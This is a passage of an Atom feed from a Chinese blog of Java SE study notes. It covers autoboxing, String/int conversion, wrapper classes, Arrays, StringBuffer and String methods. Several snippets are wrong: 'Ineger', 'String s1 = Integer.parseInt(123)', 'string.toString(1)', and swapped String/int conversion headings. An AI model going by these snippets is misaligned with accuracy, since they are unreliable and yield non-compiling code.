    <link href="http://liuhaoan.github.io/2019/04/09/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94JDK5%E6%96%B0%E7%89%B9%E6%80%A7%E4%B9%8B-%E8%87%AA%E5%8A%A8%E6%8B%86%E7%AE%B1%E4%B8%8E%E8%A3%85%E7%AE%B1/"/>
    <id>http://liuhaoan.github.io/2019/04/09/javaSE复习之——JDK5新特性之-自动拆箱与装箱/</id>
    <published>2019-04-09T09:13:54.000Z</published>
    <updated>2019-04-09T09:15:22.581Z</updated>
    
    <content type="html"><![CDATA[<h1 id="代码详解"><a href="#代码详解" class="headerlink" title="代码详解"></a>代码详解</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> x = <span class="number">123</span>;</span><br><span class="line">Integer i1 = <span class="keyword">new</span> Integer(x);</span><br><span class="line"><span class="comment">//手动装箱</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> y = i1.intValue();</span><br><span class="line"><span class="comment">//手动拆箱</span></span><br><span class="line"></span><br><span class="line">Ineger x = <span class="number">123</span>;</span><br><span class="line"><span class="comment">//自动装箱，他的底层是手动装箱</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> a = x + <span class="number">100</span>;</span><br><span class="line"><span class="comment">//自动拆箱，他的底层是自动拆箱</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;代码详解&quot;&gt;&lt;a href=&quot;#代码详解&quot; class=&quot;headerlink&quot; title=&quot;代码详解&quot;&gt;&lt;/a&gt;代码详解&lt;/h1&gt;&lt;figure class=&quot;highlight cpp&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;
      
    
    </summary>
    
      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
    
    
      <category term="新特性" scheme="http://liuhaoan.github.io/tags/%E6%96%B0%E7%89%B9%E6%80%A7/"/>
    
      <category term="JDK5" scheme="http://liuhaoan.github.io/tags/JDK5/"/>
    
      <category term="自动拆箱" scheme="http://liuhaoan.github.io/tags/%E8%87%AA%E5%8A%A8%E6%8B%86%E7%AE%B1/"/>
    
      <category term="自动装箱" scheme="http://liuhaoan.github.io/tags/%E8%87%AA%E5%8A%A8%E8%A3%85%E7%AE%B1/"/>
    
  </entry>
  
  <entry>
    <title>javaSE复习之——String转换为其他数据类型</title>
    <link href="http://liuhaoan.github.io/2019/04/09/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94String%E8%BD%AC%E6%8D%A2%E4%B8%BA%E5%85%B6%E4%BB%96%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/"/>
    <id>http://liuhaoan.github.io/2019/04/09/javaSE复习之——String转换为其他数据类型/</id>
    <published>2019-04-09T09:10:35.000Z</published>
    <updated>2019-04-09T09:12:42.799Z</updated>
    
    <content type="html"><![CDATA[<ul><li><p>代码：</p><blockquote><p>.parseXXX(“”);</p></blockquote></li><li><p>特点：</p><blockquote><p>基本数据类型包装类有八种，其中除了char其他都有<code>.parseXXX()</code>方法，因为char只能存入一个字符。</p></blockquote></li><li><p>代码示例：</p></li></ul><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String <span class="built_in">s1</span> = <span class="string">"123"</span><span class="comment">;</span></span><br><span class="line">int i = Integer.parseInt(<span class="built_in">s1</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;ul&gt;
&lt;li&gt;&lt;p&gt;代码：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;.parseXXX(“”);&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;特点：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;基本数据类型包装类有八种，其中除了char其他都有&lt;code&gt;.pa
      
    
    </summary>
    
      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
    
    
      <category term="String" scheme="http://liuhaoan.github.io/tags/String/"/>
    
      <category term="String转换为其他数据类型" scheme="http://liuhaoan.github.io/tags/String%E8%BD%AC%E6%8D%A2%E4%B8%BA%E5%85%B6%E4%BB%96%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/"/>
    
  </entry>
  
  <entry>
    <title>javaSE复习之——String与int的相互转换</title>
    <link href="http://liuhaoan.github.io/2019/04/09/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94String%E4%B8%8Eint%E7%9A%84%E7%9B%B8%E4%BA%92%E8%BD%AC%E6%8D%A2/"/>
    <id>http://liuhaoan.github.io/2019/04/09/javaSE复习之——String与int的相互转换/</id>
    <published>2019-04-09T09:04:41.000Z</published>
    <updated>2019-04-09T09:09:53.670Z</updated>
    
    <content type="html"><![CDATA[<h1 id="String转int"><a href="#String转int" class="headerlink" title="String转int"></a>String转int</h1><blockquote><p>1、String s1 = 1 + “”；</p><p>2、String s2 = string.toString(1);</p><p>3、Integer i = new Integer(1);        String s1 = i.toString();</p><p>4、String s1 = Integer.toString(1);</p></blockquote><p>ps:推荐用第一第二种方式，代码更简洁。</p><a id="more"></a><h1 id="int转String"><a href="#int转String" class="headerlink" title="int转String"></a>int转String</h1><blockquote><p>1、<br><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String <span class="built_in">s1</span> = <span class="string">"123"</span><span class="comment">;</span></span><br><span class="line">Integer i = new Integer(<span class="built_in">s1</span>)<span class="comment">;</span></span><br><span class="line">int a = i.intValue()<span class="comment">;</span></span><br></pre></td></tr></table></figure></p></blockquote><blockquote><p>2、<br><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">String</span> s1 = Integer.<span class="built_in">parseInt</span>(<span class="number">123</span>);</span><br></pre></td></tr></table></figure></p></blockquote><p>ps:推荐用第二种</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;String转int&quot;&gt;&lt;a href=&quot;#String转int&quot; class=&quot;headerlink&quot; title=&quot;String转int&quot;&gt;&lt;/a&gt;String转int&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;1、String s1 = 1 + “”；&lt;/p&gt;
&lt;p&gt;2、String s2 = string.toString(1);&lt;/p&gt;
&lt;p&gt;3、Integer i = new Integer(1);        String s1 = i.toString();&lt;/p&gt;
&lt;p&gt;4、String s1 = Integer.toString(1);&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;ps:推荐用第一第二种方式，代码更简洁。&lt;/p&gt;
    
    </summary>
    
      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
    
    
      <category term="String与int的相互转换" scheme="http://liuhaoan.github.io/tags/String%E4%B8%8Eint%E7%9A%84%E7%9B%B8%E4%BA%92%E8%BD%AC%E6%8D%A2/"/>
    
      <category term="String转int" scheme="http://liuhaoan.github.io/tags/String%E8%BD%ACint/"/>
    
      <category term="int转String" scheme="http://liuhaoan.github.io/tags/int%E8%BD%ACString/"/>
    
  </entry>
  
  <entry>
    <title>javaSE复习之——基本数据类型包装类</title>
    <link href="http://liuhaoan.github.io/2019/04/09/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E5%8C%85%E8%A3%85%E7%B1%BB/"/>
    <id>http://liuhaoan.github.io/2019/04/09/javaSE复习之——基本数据类型包装类/</id>
    <published>2019-04-09T08:58:32.000Z</published>
    <updated>2019-04-09T09:03:44.552Z</updated>
    
    <content type="html"><![CDATA[<h1 id="基本数据类型和包装类的对应表"><a href="#基本数据类型和包装类的对应表" class="headerlink" title="基本数据类型和包装类的对应表"></a>基本数据类型和包装类的对应表</h1><table><thead><tr><th>基本数据类型</th><th>包装类</th></tr></thead><tbody><tr><td>byte</td><td>Byte</td></tr><tr><td>short</td><td>Short</td></tr><tr><td>long</td><td>Long</td></tr><tr><td>float</td><td>Float</td></tr><tr><td>double</td><td>Double</td></tr><tr><td>boolean</td><td>Boolean</td></tr></tbody></table><p>—————–上面的只是改大写，下面的改的更多<br><a id="more"></a></p><table><thead><tr><th>基本数据类型</th><th>包装类</th></tr></thead><tbody><tr><td>int</td><td>Integer</td></tr><tr><td>char</td><td>Character</td></tr></tbody></table><h1 id="Integer的特点："><a href="#Integer的特点：" class="headerlink" title="Integer的特点："></a>Integer的特点：</h1><blockquote><p>1、能在int和String类型之间相互转换</p><p>2、提供了处理int类型时，非常有用的其他一些常量和方法。</p><p>3、能在创建对象时传入String类型的数据，但只<code>限于int值</code>。</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;基本数据类型和包装类的对应表&quot;&gt;&lt;a href=&quot;#基本数据类型和包装类的对应表&quot; class=&quot;headerlink&quot; title=&quot;基本数据类型和包装类的对应表&quot;&gt;&lt;/a&gt;基本数据类型和包装类的对应表&lt;/h1&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;基本数据类型&lt;/th&gt;
&lt;th&gt;包装类&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;byte&lt;/td&gt;
&lt;td&gt;Byte&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;short&lt;/td&gt;
&lt;td&gt;Short&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;long&lt;/td&gt;
&lt;td&gt;Long&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;float&lt;/td&gt;
&lt;td&gt;Float&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;double&lt;/td&gt;
&lt;td&gt;Double&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;boolean&lt;/td&gt;
&lt;td&gt;Boolean&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;—————–上面的只是改大写，下面的改的更多&lt;br&gt;
    
    </summary>
    
      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
    
    
      <category term="基本数据类型包装类" scheme="http://liuhaoan.github.io/tags/%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E5%8C%85%E8%A3%85%E7%B1%BB/"/>
    
  </entry>
  
  <entry>
    <title>javaSE复习之——Arrays类</title>
    <link href="http://liuhaoan.github.io/2019/04/09/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94Arrays%E7%B1%BB/"/>
    <id>http://liuhaoan.github.io/2019/04/09/javaSE复习之——Arrays类/</id>
    <published>2019-04-09T08:51:02.000Z</published>
    <updated>2019-04-09T08:57:34.400Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Arrays类的概述"><a href="#Arrays类的概述" class="headerlink" title="Arrays类的概述"></a>Arrays类的概述</h1><blockquote><p>它其实就是一个数组的工具类，提供各种关于数组的操作</p></blockquote><a id="more"></a><h1 id="Arrats的方法："><a href="#Arrats的方法：" class="headerlink" title="Arrats的方法："></a>Arrats的方法：</h1><ul><li>.toString()<blockquote><p>数组转换为字符串</p></blockquote></li><li>.sort()<blockquote><p>数组排序</p></blockquote></li><li>.binarySearch()<blockquote><p>二分查找，<code>返回索引值</code>，如果没找到就返回，<code>被查找数据在数组中应该出现的插入点的负数 减去1</code></p><p>前提：这个数组是一个序列数组</p></blockquote></li><li>.asList()<blockquote><p>把数组转换成集合，用List引用。<br>例子：</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">List</span>&lt;<span class="keyword">String</span>&gt; l = <span class="keyword">Arrays</span>.asList(数组);</span><br></pre></td></tr></table></figure></blockquote></li></ul><ul><li>数组转集合的意义：<blockquote><p>虽然从<code>数组转换成的集合</code>不能增加和减少，但是我们可以用集合的思想来操作数组，也就是用集合除add、remove以外的方法。</p></blockquote></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Arrays类的概述&quot;&gt;&lt;a href=&quot;#Arrays类的概述&quot; class=&quot;headerlink&quot; title=&quot;Arrays类的概述&quot;&gt;&lt;/a&gt;Arrays类的概述&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;它其实就是一个数组的工具类，提供各种关于数组的操作&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
    
    
      <category term="Arrays类" scheme="http://liuhaoan.github.io/tags/Arrays%E7%B1%BB/"/>
    
  </entry>
  
  <entry>
    <title>javaSE复习之——StringBuffer类</title>
    <link href="http://liuhaoan.github.io/2019/04/09/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94StringBuffer%E7%B1%BB/"/>
    <id>http://liuhaoan.github.io/2019/04/09/javaSE复习之——StringBuffer类/</id>
    <published>2019-04-09T08:31:59.000Z</published>
    <updated>2019-04-09T08:49:48.694Z</updated>
    
    <content type="html"><![CDATA[<h1 id="StringBuffer的概述"><a href="#StringBuffer的概述" class="headerlink" title="StringBuffer的概述"></a>StringBuffer的概述</h1><blockquote><p>1、它是<code>字符串缓冲区</code>（容器），底层默认是长度为16的<code>字符数组</code>。</p><p>2、StringBuffer是<code>线程安全</code>的，StringBuilder是<code>线程不安全</code>的</p><p>3、线程安全速度更<code>慢</code>，线程不安全速度更<code>快</code>。</p></blockquote><a id="more"></a><h1 id="StringBuffer与String的区别"><a href="#StringBuffer与String的区别" class="headerlink" title="StringBuffer与String的区别"></a>StringBuffer与String的区别</h1><blockquote><p>1、String赋的值它是<code>不能被改变的</code>，只能丢弃重新创建，<code>如果字符拼接过多会产生过多的垃圾</code>。</p><p>2、StringBuffer赋的值是<code>可以被改变的</code>，类似字符拼接<code>建议</code>用这个类，因为<code>不会产生过多的垃圾</code>。</p><p>2、虽然它们都是<code>引用数据类型</code>，但是String<code>做参数</code>传递时是和基本数据类型一样的，而StringBuffer传递的只是对创建对象的引用，也就是地址值。</p></blockquote><h1 id="StringBuffer的方法"><a href="#StringBuffer的方法" class="headerlink" title="StringBuffer的方法"></a>StringBuffer的方法</h1><ul><li>属性获取：<blockquote><p>.capacity()<br>返回当前容量</p><p>.length()<br>返回实际长度</p></blockquote></li></ul><ul><li>数据添加：<blockquote><p>.append()<br>把任何数据传入字符串缓冲区，然后返回缓冲区对象本身。</p><p>.insert(索引,字符串)<br>在任意位置之后将任意类型数据插入字符串缓冲取内，返回本身。</p></blockquote></li></ul><ul><li>数据删除：<blockquote><p>.deleteCharAt()<br>删除任意索引的数据，返回本身。</p><p>.delete(索引1,索引2)<br>删除从索引1开始到索引2位置的数据，返回本身。（包含头不包含尾）</p></blockquote></li></ul><ul><li>数据替换反转：<blockquote><p>.reverse()<br>字符反转</p><p>.replace(开始索引，结束索引，要替换的数据)&gt;<br>字符替换</p></blockquote></li></ul><ul><li>数据截取：（截取后返回的数据不是表示容器本身，而是返回一个String）<blockquote><p>.subString(索引)<br>从索引开始，截取到字符串末尾。</p><p>.subString(开始,结尾)<br>从开始位置截取字符串到结尾位置，不包括结尾索引。    </p></blockquote></li></ul><h1 id="StringBuffer的构造方法特点"><a href="#StringBuffer的构造方法特点" class="headerlink" title="StringBuffer的构造方法特点"></a>StringBuffer的构造方法特点</h1><blockquote><p>1、无参构造默认容量为 <code>16个字符</code></p><p>2、传入整数，比如传入10，那么这个容器的<code>容量</code>就为10个字符</p><p>3、传入一个字符串，比如传入：啊啊，那么实际长度为4，<code>字符串缓冲区容量为20</code></p><p>4、如果<code>内部缓冲区溢出</code>，那么容量自动增大。</p><p>5、StringBuffer重写了toString()方法，显示的是它的属性值，也就是它的元素。</p></blockquote><h1 id="StringBuffer注意事项"><a href="#StringBuffer注意事项" class="headerlink" title="StringBuffer注意事项"></a>StringBuffer注意事项</h1><blockquote><p>1、不要利用重新创建另一个对象来试图<code>清空容器</code>，这只是<code>引用了另一个容器对象</code>而已，之前的那个容器并没有被清空，可以利用<code>delete</code>方法清空容器。</p><p>2、因为String与任意字符串<code>相加</code>的底层实现就是使用容器，并且String的值是<code>不能修改的</code>，它只能把之前的数据做垃圾处理重新创建一个数据，这样会<code>不断的产生垃圾</code>，所以在类似 <code>字符串数组</code> 转换成 <code>字符串</code> 或者 <code>字符串拼接</code>（String s = s1 + s2；） 的例程中使用容器最好。</p></blockquote><h1 id="StringBuffer与String的互转："><a href="#StringBuffer与String的互转：" class="headerlink" title="StringBuffer与String的互转："></a>StringBuffer与String的互转：</h1><ul><li>StringBuffer转String<blockquote><p>1、创建一个String对象，把容器传进去。</p><p>2、使用toString()方法。</p><p>3、使用subString()方法。</p></blockquote></li></ul><ul><li>String转StringBuffer<blockquote><p>1、创建一个StringBuffer对象，传入字符串即可。</p><p>2、通过append()方法把字符串加入到容器内。</p></blockquote></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;StringBuffer的概述&quot;&gt;&lt;a href=&quot;#StringBuffer的概述&quot; class=&quot;headerlink&quot; title=&quot;StringBuffer的概述&quot;&gt;&lt;/a&gt;StringBuffer的概述&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;1、它是&lt;code&gt;字符串缓冲区&lt;/code&gt;（容器），底层默认是长度为16的&lt;code&gt;字符数组&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;2、StringBuffer是&lt;code&gt;线程安全&lt;/code&gt;的，StringBuilder是&lt;code&gt;线程不安全&lt;/code&gt;的&lt;/p&gt;
&lt;p&gt;3、线程安全速度更&lt;code&gt;慢&lt;/code&gt;，线程不安全速度更&lt;code&gt;快&lt;/code&gt;。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
    
    
      <category term="StringBuffer类" scheme="http://liuhaoan.github.io/tags/StringBuffer%E7%B1%BB/"/>
    
  </entry>
  
  <entry>
    <title>javaSE复习之——String类</title>
    <link href="http://liuhaoan.github.io/2019/04/09/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94String%E7%B1%BB/"/>
    <id>http://liuhaoan.github.io/2019/04/09/javaSE复习之——String类/</id>
    <published>2019-04-09T07:42:02.000Z</published>
    <updated>2019-04-09T08:31:15.266Z</updated>
    
    <content type="html"><![CDATA[<h1 id="String类的概述"><a href="#String类的概述" class="headerlink" title="String类的概述"></a>String类的概述</h1><ul><li>它的实例用来存储字符串，在平时的使用中我们会经常用到，通常初学者会以为它是一个<code>基本数据类型</code>，但其实它是一个<code>引用数据类型</code>.</li></ul><a id="more"></a><h1 id="String类特点："><a href="#String类特点：" class="headerlink" title="String类特点："></a>String类特点：</h1><ul><li>1、String实际上是一个类，它重写了toString方法，所以创建String引用后<code>直接输出调用该引用的名称</code>就可以输出<code>字符串</code>数据。</li></ul><ul><li>2、String属于<code>引用数据类型</code>，而不是<code>基本数据类型</code>，基本数据类型为：int、char。。。，所以String数据对比需要用到<code>equals</code>方法，否则会出现判断不准确的问题</li></ul><ul><li>3、String没有set和get方法，所以它<code>不存在修改数据</code>，只能是<code>替换数据</code>，把之前的数据当作垃圾。</li></ul><ul><li>4、String s = “abc”     与 String a = “abc”    它们两个变量其实是记录了<code>常量池中的地址值</code>，而常量池有个特性，就是<code>已有的数据它不会再去创建</code>，所以 <code>s==a为ture</code></li></ul><ul><li>5、<code>String s = &quot;a&quot; + &quot;b&quot; + &quot;c&quot;</code>    同等于<code>String a = &quot;abc&quot;</code>    因为java有<code>常量优化机制</code>，java编译时已经确定<code>s = abc</code>，所以s拿到的是常量abc的地址。</li></ul><ul><li>6、</li></ul><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">String <span class="selector-tag">b</span> = <span class="string">"ab"</span></span><br><span class="line">String c = <span class="string">"abc"</span></span><br><span class="line">c == <span class="selector-tag">a</span> + <span class="string">"c"</span></span><br><span class="line"><span class="comment">//结果为false</span></span><br></pre></td></tr></table></figure><blockquote><p>解析：因为<code>任何数据</code>与<code>字符串用 + 连接</code>，会在堆内存中创建<code>StringBuider</code> 或 <code>StringBuffer</code>缓冲区对象并使用append方法<code>把数据相连</code>，这里会得出：<code>&quot;abc&quot;</code>然后再使用toString方法<code>创建一个“abc”的String对象返回</code>这个”abc”被保存在<code>堆内存</code>中，而不是保存在<code>常量池</code>，所以变量c的值是<code>常量池</code>中的地址，而a + “c”是<code>堆内存</code>中的地址，所以用“==”号做比较返回false</p></blockquote><ul><li>7、String赋的值是<code>不可以被改变的</code>，只有把之前的值丢弃变成垃圾后，再赋新的值。</li></ul><ul><li>8、String虽然是<code>引用数据类型</code>，但是它当作参数传递的时候，它是和基本数据类型一样的。</li></ul><h1 id="获取键盘输入String需要注意的"><a href="#获取键盘输入String需要注意的" class="headerlink" title="获取键盘输入String需要注意的"></a>获取键盘输入String需要注意的</h1><blockquote><p>System.in</p><p>它是标准的输入流，对应着键盘录入</p><p>sc.hasNextxxx（）</p><p>它判断输入的数是不是xxx数据类型，xxx可以是int、double等</p><p>sc.nextxxx（）</p><p>它获取已经输入的项，xxx和上面的xxx相同</p><p>sc.nextLine()</p><p>它获取字符串，遇到/r/n就结束，也是因为这个机制，所以和其他获取输入命令混用会出现获取不到的问题，举个例子。</p><p>例：nextInt() 之后又用 nexiLine()</p><p>获取的是整数，而实际是全部内容为  <code>数值/r/n</code>  此命令只获取数值部分，所以留下了/r/n，然后nextLine见到上面这个/r/n就直接结束了。</p></blockquote><ul><li>解决方法：录入所有数据都用nextLine，然后通过数据转换来实现。</li></ul><h1 id="String的构造方法"><a href="#String的构造方法" class="headerlink" title="String的构造方法"></a>String的构造方法</h1><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">String</span> str = <span class="keyword">new</span> <span class="keyword">String</span>(Byte[] b);</span><br><span class="line"><span class="comment">//有参构造</span></span><br></pre></td></tr></table></figure><blockquote><p>可以按照平台的默认字符集（也就是码表，GBK等等）<code>解码byte</code>数组，而gbk等码表都涵盖了ascii码表，而码表中98、99等代码都代表着ab等，所以解码后看到的和解码前的数据不一样。</p></blockquote><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">String</span> str = <span class="keyword">new</span> <span class="keyword">String</span>(Byte[] b,<span class="number">2</span>,<span class="number">4</span>);</span><br><span class="line"><span class="comment">//表示从b数组中的第二个索引开始解码，总共解码4个数据</span></span><br></pre></td></tr></table></figure><h1 id="String类的判断功能"><a href="#String类的判断功能" class="headerlink" title="String类的判断功能"></a>String类的判断功能</h1><ul><li>.equals()<blockquote><p>比较字符串内容序列是否相同，区分大小写</p></blockquote></li><li>.equalsIgnoreCase()<blockquote><p>与上面不同的是：不区分大小写</p></blockquote></li><li>.contains()<blockquote><p>判断字符串中是否包含传入的字符串</p></blockquote></li><li>.startsWith()<blockquote><p>判断字符串是否以传入字符串开头</p></blockquote></li><li>.endswith()<blockquote><p>判断字符串是否以传入字符串结尾</p></blockquote></li><li>.isEmpty()    <blockquote><p>判断字符串是否为空</p></blockquote></li></ul><h1 id="Null与””的区别"><a href="#Null与””的区别" class="headerlink" title="Null与””的区别"></a>Null与””的区别</h1><blockquote><p>“”是<code>字符串常量</code>，也是String类的对象，所以可以调用String类的方法</p><p>Null是<code>空常量</code>，不能调用任何方法，否则会出现空指针异常，Null可以给<code>任意引用数据类型</code>赋值。</p></blockquote><ul><li>注意事项：<blockquote><p>1、以后比较字符串时最好<code>都用equals</code>，因为equals比较的是内容，而==号比较的时后，有时比较的是<code>地址值</code></p><p>2、使用equals时，有常量就用常量对象的equals方法，<code>尽量不用变量对象的equals方法</code>，因为变量对象的值有<code>可能时null</code>，调用<code>equals方法会出现空指针异常</code></p></blockquote></li></ul><h1 id="String类的获取功能"><a href="#String类的获取功能" class="headerlink" title="String类的获取功能"></a>String类的获取功能</h1><ul><li>.length()<blockquote><p>获取字符串长度(字符个数)    </p><p>例子：<code>&quot;我&quot;.length()</code> 为1</p><p>ps：数组中的length是<code>属性</code>，而String中的是对象<code>方法</code></p></blockquote></li><li>.charAt()<blockquote><p>获取指定索引的字符</p></blockquote></li><li>.indexOf()    <blockquote><p>返回字符 或 字符串在此字符串中<code>第一次出现的索引</code></p><p>如果不存在返回-1</p><p>如果查找的是字符串，返回索引就是查找字符串<code>第一个字符的索引</code></p></blockquote></li><li>.indexOf(,)<blockquote><p>与上面不同的是在某个位置之后查找</p></blockquote></li><li>.lastIndexOf()    <blockquote><p>从后向前找</p></blockquote></li><li>.substring()<blockquote><p>从指定位置开始<code>截取字符串</code>，默认到末尾</p></blockquote></li><li>.substring(,)<blockquote><p>与上不同的是自己<code>指定了截取字符串的尾部位置</code>并且，<code>包含头不包含尾部</code></p><p>注意：截取字符串之后需要用一个变量来保存，因为substring是<code>不会改变原来的值</code>的。</p></blockquote></li></ul><h1 id="GBK码表的特性"><a href="#GBK码表的特性" class="headerlink" title="GBK码表的特性"></a>GBK码表的特性</h1><blockquote><p>1、中文是<code>两个字节</code>组成</p><p>2、中文字节的<code>第一个字节一定是负数</code></p></blockquote><h1 id="String类的类型转换功能"><a href="#String类的类型转换功能" class="headerlink" title="String类的类型转换功能"></a>String类的<code>类型转换</code>功能</h1><ul><li>.getBytes()<blockquote><p>把<code>字符串转换成字节数组</code>，这是一个编码的过程：<code>把我们看的懂的编码成计算机看得懂的</code></p></blockquote></li><li>.toCharArray()<blockquote><p>转换成字符数组</p></blockquote></li><li>String.valueOf（）<blockquote><p>把字符数组转换为字符串，传入一个字符数组，返回一个字符串</p><p>注意：    </p><p>1、传入的数组类型可以是<code>任意类型</code>，并且底层还是由String的<code>构造方法</code>来解码的。</p><p>2、此方法可以传入任意object对象，如果传入的是一个对象，那么默认调用对象的toString方法</p></blockquote></li><li>.toLowerCase()<blockquote><p>把字符串转换为小写</p></blockquote></li><li>.toUpperase()<blockquote><p>把字符串转换为大写</p></blockquote></li></ul><p>ps：String中字符的转换都是按照unicode码表来转换的</p><h1 id="String的其他功能"><a href="#String的其他功能" class="headerlink" title="String的其他功能"></a>String的其他功能</h1><ul><li>.repleace(被替换的字符串，要替换成的字符串)<blockquote><p>字符或字符串替换，不存在则不改变</p></blockquote></li><li>.trim()<blockquote><p>去除首尾空格</p></blockquote></li><li>.compareTo()<blockquote><p>按照字典顺序比较两个字符串</p></blockquote></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;String类的概述&quot;&gt;&lt;a href=&quot;#String类的概述&quot; class=&quot;headerlink&quot; title=&quot;String类的概述&quot;&gt;&lt;/a&gt;String类的概述&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;它的实例用来存储字符串，在平时的使用中我们会经常用到，通常初学者会以为它是一个&lt;code&gt;基本数据类型&lt;/code&gt;，但其实它是一个&lt;code&gt;引用数据类型&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
    
    
      <category term="String类" scheme="http://liuhaoan.github.io/tags/String%E7%B1%BB/"/>
    
  </entry>
  
  <entry>
    <title>javaSE复习之——Object类</title>
    <link href="http://liuhaoan.github.io/2019/04/09/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94Object%E7%B1%BB/"/>
    <id>http://liuhaoan.github.io/2019/04/09/javaSE复习之——Object类/</id>
    <published>2019-04-09T07:19:43.000Z</published>
    <updated>2019-04-09T07:40:26.878Z</updated>
    
